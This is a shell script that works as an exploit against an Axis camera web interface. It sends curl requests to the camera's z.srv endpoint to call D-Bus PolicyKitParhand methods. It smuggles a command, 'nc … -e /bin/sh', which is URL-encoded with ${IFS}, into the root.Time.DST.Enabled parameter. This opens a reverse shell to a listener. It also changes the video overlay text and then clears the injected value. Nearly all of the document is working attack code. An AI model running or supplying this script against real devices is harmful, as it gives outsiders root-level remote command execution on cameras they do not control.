#!/bin/sh

_LISTEN_IP="127.0.0.1"
_LISTEN_PORT=1337

_TARGET_IP=${1}
_TARGET_PORT=${2}
_TARGET_URI="index.shtml"

#_PROXY="--proxy http://127.0.0.1:8080"

_OVERLAY_VALUE="WTF?"


# Injected command MUST HAVE ${IFS} for spaces and MUST BE URL encoded!!!!
_INJECT_CMD="nc%24%7bIFS%7d${_LISTEN_IP}%24%7bIFS%7d${_LISTEN_PORT}%24%7bIFS%7d-e%24%7bIFS%7d/bin/sh"
#_INJECT_CMD="nc ${_LISTEN_IP} ${_LISTEN_PORT} -e /bin/sh"
#_INJECT_CMD="nc\${IFS}${_LISTEN_IP}\${IFS}${_LISTEN_PORT}\${IFS}-e\${IFS}/bin/sh"

echo "Command to be injected into root.Time.DST.Enabled: ${_INJECT_CMD}"

connection_test() {
    _TEST_STR="curl ${_PROXY} -i \"http://${_TARGET_IP}:${_TARGET_PORT}/${_TARGET_URI}/srv.srv\" --data \"action=abc&return_page=it_worked\""

    echo "Testing connection with the following:"
    echo ${_TEST_STR}
    echo "\n"
    eval ${_TEST_STR}
}

sync_value() {
    echo "Sync root.Time.DST.Enabled"
    #_SYNC_STR="curl ${_PROXY} -i \"http://${_TARGET_IP}:${_TARGET_PORT}/${_TARGET_URI}/z.srv\" --data \"action=dbus&args=--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SynchParameters\""
    _SYNC_STR="curl ${_PROXY} -i \"http://${_TARGET_IP}:${_TARGET_PORT}/${_TARGET_URI}/z.srv\" --data \"action=dbus&args=--system%20--dest%3dcom.axis.PolicyKitParhand%20--type%3dmethod_call%20/com/axis/PolicyKitParhand%20com.axis.PolicyKitParhand.SynchParameters\""

    echo ${_SYNC_STR}
    eval ${_SYNC_STR}
    echo "\n"
    sleep 1
}

set_overlay_value() {
    #_SET_STR="curl ${_PROXY} -i \"http://${_TARGET_IP}:${_TARGET_PORT}/${_TARGET_URI}/z.srv\" --data \"action=dbus&args=--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:Image.I0.Text.String string:${_OVERLAY_VALUE}\""
   _SET_STR="curl ${_PROXY} -i \"http://${_TARGET_IP}:${_TARGET_PORT}/${_TARGET_URI}/z.srv\" --data \"action=dbus&args=--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:Image.I0.Text.String string:${_OVERLAY_VALUE}\""

    echo ${_SET_STR}
    eval ${_SET_STR}
    echo "\n"
    sync_value
}

set_cmd_clear() {
    echo "Clearing value of root.Time.DST.Enabled by setting to True"
    _SET_STR="curl ${_PROXY} -i \"http://${_TARGET_IP}:${_TARGET_PORT}/${_TARGET_URI}/z.srv\" --data \"action=dbus&args=--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:True\""
    
    echo ${_SET_STR}
    eval ${_SET_STR}
    echo "\n"
    sync_value
}

set_cmd_value() {
    echo "Setting value of root.Time.DST.Enabled to _INJECT_CMD"
    _SET_STR="curl ${_PROXY} -i \"http://${_TARGET_IP}:${_TARGET_PORT}/${_TARGET_URI}/z.srv\" --data \"action=dbus&args=--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:;(${_INJECT_CMD})&\""
    #_SET_STR="curl ${_PROXY} -i \"http://${_TARGET_IP}:${_TARGET_PORT}/${_TARGET_URI}/z.srv\" --data \"action=dbus&args=--system%20--dest%3dcom.axis.PolicyKitParhand%20--type%3dmethod_call%20/com/axis/PolicyKitParhand%20com.axis.PolicyKitParhand.SetParameter%20string%3aroot.Time.DST.Enabled%20string%3a%3b%28${_INJECT_CMD}%29%26\""

    echo ${_SET_STR}
    eval ${_SET_STR}
    echo "\n"
    sync_value
}

echo "Testing connection..."
connection_test
echo "\n-------\n\n"

# Set overlay value
set_overlay_value

# Set root.Time.DST.Enabled to True to clear and sync
set_cmd_clear

# Set root.Time.DST.Enabled to command and sync
set_cmd_value

# Reset root.Time.DST.Enabled to True to clear and sync
set_cmd_clear

